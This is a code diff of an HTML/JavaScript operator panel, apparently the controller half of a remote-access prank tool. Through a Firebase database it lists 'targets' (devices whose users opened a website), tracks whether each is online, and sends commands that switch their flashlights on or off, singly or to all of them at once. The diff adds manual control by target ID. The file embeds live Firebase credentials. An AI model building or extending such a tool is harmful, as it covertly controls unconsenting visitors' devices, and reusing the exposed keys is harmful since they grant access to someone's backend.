@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Controller Senter Remote</title>
+    <title>Remote Senter Controller😈</title>
     <style>
         * {
             margin: 0;
@@ -22,7 +22,7 @@
         }
         h1 {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             border-bottom: 2px solid #00ff00;
             padding-bottom: 10px;
             font-size: 24px;
@@ -39,43 +39,72 @@
             margin-bottom: 20px;
             border-radius: 5px;
         }
+        .manual-control {
+            background: #111;
+            border: 1px solid #ff00ff;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        .manual-control input {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-family: monospace;
+            font-size: 16px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        .manual-control button {
+            background: #00ff00;
+            color: black;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+            width: calc(50% - 12px);
+        }
+        .manual-control button.off {
+            background: #ff0000;
+            color: white;
+        }
         .target-list {
             background: #111;
             border: 1px solid #00ff00;
             padding: 15px;
             border-radius: 5px;
-            margin-bottom: 20px;
         }
         .target-item {
             border: 1px solid #333;
             padding: 15px;
             margin: 10px 0;
             border-radius: 5px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
             background: #1a1a1a;
-        }
-        .target-info {
-            flex: 1;
         }
         .target-id {
             color: #00ff00;
             font-weight: bold;
-            font-size: 18px;
+            font-size: 16px;
+            cursor: pointer;
         }
-        .target-status {
+        .target-id:hover {
+            text-decoration: underline;
+        }
+        .target-time {
             color: #ffff00;
             font-size: 12px;
         }
-        .flashlight-status {
+        .flash-status {
             display: inline-block;
-            padding: 5px 10px;
+            padding: 3px 8px;
             border-radius: 3px;
             font-size: 12px;
-            font-weight: bold;
-            margin-top: 5px;
+            margin: 5px 0;
         }
         .status-on {
             background: #00ff00;
@@ -83,66 +112,50 @@
         }
         .status-off {
             background: #333;
-            color: #666;
+            color: #ccc;
         }
         .controls {
             display: flex;
             gap: 10px;
             margin-top: 10px;
         }
-        button {
+        .controls button {
             background: #00ff00;
             color: black;
             border: none;
-            padding: 10px 20px;
+            padding: 10px;
             border-radius: 3px;
             font-weight: bold;
             cursor: pointer;
-            font-family: 'Courier New', monospace;
-            transition: all 0.3s;
             flex: 1;
         }
-        button:hover {
-            background: #00cc00;
-            transform: scale(0.98);
-        }
-        button.on-btn {
-            background: #00ff00;
-        }
-        button.off-btn {
+        .controls button.off {
             background: #ff0000;
             color: white;
         }
-        button.off-btn:hover {
-            background: #cc0000;
-        }
-        .broadcast-section {
-            background: #111;
-            border: 1px solid #00ff00;
-            padding: 20px;
-            border-radius: 5px;
+        .broadcast {
             margin-top: 20px;
+            padding: 20px;
+            background: #111;
+            border: 1px solid #ff00ff;
+            border-radius: 5px;
         }
         .broadcast-btn {
             background: #ff00ff;
             color: white;
-            font-size: 18px;
+            font-size: 16px;
             padding: 15px;
             width: 100%;
             margin: 5px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
         }
         .footer {
-            text-align: center;
             margin-top: 30px;
+            text-align: center;
             color: #666;
             font-size: 12px;
-            border-top: 1px solid #333;
-            padding-top: 20px;
-        }
-        .online-count {
-            color: #00ff00;
-            font-weight: bold;
-            font-size: 20px;
         }
     </style>
     
@@ -153,129 +166,149 @@
 <body>
     <div class="container">
         <h1>
-            🔦 SENTER REMOTE CONTROLLER
+            🔦 REMOTE SENTER CONTROLLER
             <span>© Architect 02 - RianModss</span>
         </h1>
         
         <div class="stats" id="stats">
-            📊 TARGET ONLINE: <span class="online-count" id="onlineCount">0</span>
+            📊 Target Online: <span id="onlineCount">0</span>
         </div>
         
-        <div class="target-list" id="targetList">
-            <h3>🎯 TARGET TERSAMBUNG:</h3>
+        <div class="manual-control">
+            <h3>🎮 KONTROL MANUAL (LANGSUNG)</h3>
+            <input type="text" id="manualTargetId" placeholder="Masukkan ID Target (cth: target_abc123)">
+            <div>
+                <button onclick="manualControl('on')">🔦 NYALAIN</button>
+                <button class="off" onclick="manualControl('off')">⚫ MATIIN</button>
+            </div>
+            <p style="color:#666; font-size:12px; margin-top:10px;">Kalo ga muncul di daftar, pake ini aja</p>
+        </div>
+        
+        <div class="target-list">
+            <h3>🎯 DAFTAR TARGET ONLINE:</h3>
             <div id="targets">
                 <p style="color: #666; text-align: center;">Menunggu target buka website...</p>
             </div>
         </div>
         
-        <div class="broadcast-section">
-            <h3>📢 BROADCAST KE SEMUA TARGET</h3>
-            <button class="broadcast-btn on-btn" onclick="broadcastTorch('on')">
+        <div class="broadcast">
+            <h3>📢 BROADCAST KE SEMUA</h3>
+            <button class="broadcast-btn" onclick="broadcastTorch('on')">
                 🔦 NYALAIN SENTER SEMUA
             </button>
-            <button class="broadcast-btn off-btn" onclick="broadcastTorch('off')">
+            <button class="broadcast-btn" style="background:#ff0000;" onclick="broadcastTorch('off')">
                 ⚫ MATIIN SENTER SEMUA
             </button>
-            <p style="color: #666; margin-top: 10px; font-size: 12px;">
-                *Semua target yang online bakal nyala/mati serentak
-            </p>
         </div>
         
         <div class="footer">
             ⚡ REAL-TIME CONTROL VIA FIREBASE<br>
-            Copyright © RianModss
+            Klik ID target buat auto-fill ke input manual
         </div>
     </div>
 
     <script>
-// FIREBASE CONFIG - COPY PASTE INI!
-const firebaseConfig = {
-  apiKey: "AIzaSyCoC-uCqyiuE_jrJlVbRXrqlNsqiRrTLHU",
-  authDomain: "otrat-27a09.firebaseapp.com",
-  databaseURL: "https://otrat-27a09-default-rtdb.firebaseio.com",
-  projectId: "otrat-27a09",
-  storageBucket: "otrat-27a09.firebasestorage.app",
-  messagingSenderId: "414699965939",
-  appId: "1:414699965939:web:8625a69791a8d839021686",
-  measurementId: "G-0DNCZQ2TTC"
-};
-
-// Initialize Firebase
-firebase.initializeApp(firebaseConfig);
-const database = firebase.database();
+        // ========== GANTI DENGAN CONFIG FIREBASE LU (SAMA PERSIS) ==========
+        const firebaseConfig = {
+            apiKey: "AIzaSyCoC-uCqyiuE_jrJlVbRXrqlNsqiRrTLHU",
+            authDomain: "otrat-27a09.firebaseapp.com",
+            databaseURL: "https://otrat-27a09-default-rtdb.firebaseio.com",
+            projectId: "otrat-27a09",
+            storageBucket: "otrat-27a09.firebasestorage.app",
+            messagingSenderId: "414699965939",
+            appId: "1:414699965939:web:8625a69791a8d839021686"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
         
         // Referensi ke semua target
         const targetsRef = database.ref('targets');
         
-        // Update UI ketika ada target baru
+        // Update tampilan ketika ada perubahan
         targetsRef.on('value', (snapshot) => {
             const targets = snapshot.val();
             const targetsDiv = document.getElementById('targets');
             const onlineCount = document.getElementById('onlineCount');
             
             if (!targets) {
-                targetsDiv.innerHTML = '<p style="color: #666; text-align: center;">Belum ada target buka website...</p>';
+                targetsDiv.innerHTML = '<p style="color: #666; text-align: center;">Belum ada target...</p>';
                 onlineCount.innerText = '0';
                 return;
             }
             
             let html = '';
-            let count = 0;
+            let online = 0;
+            const now = Date.now();
             
             // Loop setiap target
             Object.keys(targets).forEach(key => {
                 const target = targets[key];
-                const lastSeen = new Date(target.lastSeen);
-                const now = new Date();
-                const diffMinutes = Math.floor((now - lastSeen) / 60000);
-                
-                // Anggep online kalo lastSeen < 2 menit
-                const isOnline = diffMinutes < 2;
-                if (isOnline) count++;
+                const lastSeen = target.lastSeen || target.timestamp || 0;
+                const isOnline = (now - lastSeen) < 70000; // 70 detik
+            
+                if (isOnline) online++;
                 
                 const flashlightStatus = target.flashlight === 'on' ? 'ON' : 'OFF';
-                const flashlightClass = target.flashlight === 'on' ? 'status-on' : 'status-off';
+                const statusClass = target.flashlight === 'on' ? 'status-on' : 'status-off';
                 
                 html += `
                     <div class="target-item">
-                        <div class="target-info">
-                            <div class="target-id">📱 ${key}</div>
-                            <div class="target-status">
-                                ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'} | 
-                                Last: ${lastSeen.toLocaleTimeString()} | 
-                                UA: ${target.userAgent ? target.userAgent.substring(0, 30) : 'unknown'}...
-                            </div>
-                            <div>
-                                <span class="flashlight-status ${flashlightClass}">
-                                    🔦 SENTER: ${flashlightStatus}
-                                </span>
-                            </div>
+                        <div class="target-id" onclick="fillTargetId('${key}')">📱 ${key}</div>
+                        <div class="target-time">
+                            ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'} | 
+                            Last: ${new Date(lastSeen).toLocaleTimeString()}
+                        </div>
+                        <div>
+                            <span class="flash-status ${statusClass}">
+                                🔦 SENTER: ${flashlightStatus}
+                            </span>
                         </div>
                         <div class="controls">
-                            <button class="on-btn" onclick="sendCommand('${key}', 'on')">NYALAIN</button>
-                            <button class="off-btn" onclick="sendCommand('${key}', 'off')">MATIIN</button>
+                            <button onclick="sendCommand('${key}', 'on')">NYALAIN</button>
+                            <button class="off" onclick="sendCommand('${key}', 'off')">MATIIN</button>
                         </div>
                     </div>
                 `;
             });
             
-            targetsDiv.innerHTML = html || '<p style="color: #666; text-align: center;">Belum ada target...</p>';
-            onlineCount.innerText = count;
+            targetsDiv.innerHTML = html;
+            onlineCount.innerText = online;
         });
         
         // Fungsi kirim command ke target tertentu
         function sendCommand(targetId, state) {
             database.ref('commands/' + targetId).set({
                 torch: state,
-                timestamp: new Date().toISOString()
+                timestamp: Date.now()
             });
-            
-            // Notifikasi
-            alert(`✅ Command dikirim ke ${targetId}: SENTER ${state.toUpperCase()}`);
+            alert('✅ Command dikirim ke ' + targetId);
         }
         
-        // Fungsi broadcast ke semua target
+        // Fungsi kontrol manual (langsung input ID)
+        function manualControl(state) {
+            const targetId = document.getElementById('manualTargetId').value.trim();
+            if (!targetId) {
+                alert('❌ Masukkan ID target dulu, kontol!');
+                return;
+            }
+            database.ref('commands/' + targetId).set({
+                torch: state,
+                timestamp: Date.now()
+            });
+            alert('✅ Command dikirim ke ' + targetId);
+        }
+        
+        // Fungsi buat auto-fill ID ke input manual
+        function fillTargetId(id) {
+            document.getElementById('manualTargetId').value = id;
+        }
+        
+        // Fungsi broadcast ke semua target online
         function broadcastTorch(state) {
+            if (!confirm(`Yakin mau ${state === 'on' ? 'NYALAIN' : 'MATIIN'} SEMUA target?`)) return;
+            
             targetsRef.once('value', (snapshot) => {
                 const targets = snapshot.val();
                 if (!targets) {
@@ -284,16 +317,14 @@ const database = firebase.database();
                 }
                 
                 let count = 0;
+                const now = Date.now();
+                
                 Object.keys(targets).forEach(key => {
-                    const lastSeen = new Date(targets[key].lastSeen);
-                    const now = new Date();
-                    const diffMinutes = Math.floor((now - lastSeen) / 60000);
-                    
-                    // Cuma kirim ke yang online (< 2 menit)
-                    if (diffMinutes < 2) {
+                    const lastSeen = targets[key].lastSeen || targets[key].timestamp || 0;
+                    if ((now - lastSeen) < 70000) { // Online dalam 70 detik
                         database.ref('commands/' + key).set({
                             torch: state,
-                            timestamp: new Date().toISOString()
+                            timestamp: now
                         });
                         count++;
                     }
@@ -302,6 +333,11 @@ const database = firebase.database();
                 alert(`✅ Broadcast ke ${count} target: SENTER ${state.toUpperCase()}`);
             });
         }
+        
+        // Auto-refresh setiap 5 detik
+        setInterval(() => {
+            // Ga usah ngapa-ngapain, Firebase udah realtime
+        }, 5000);
     </script>
 </body>
 </html>
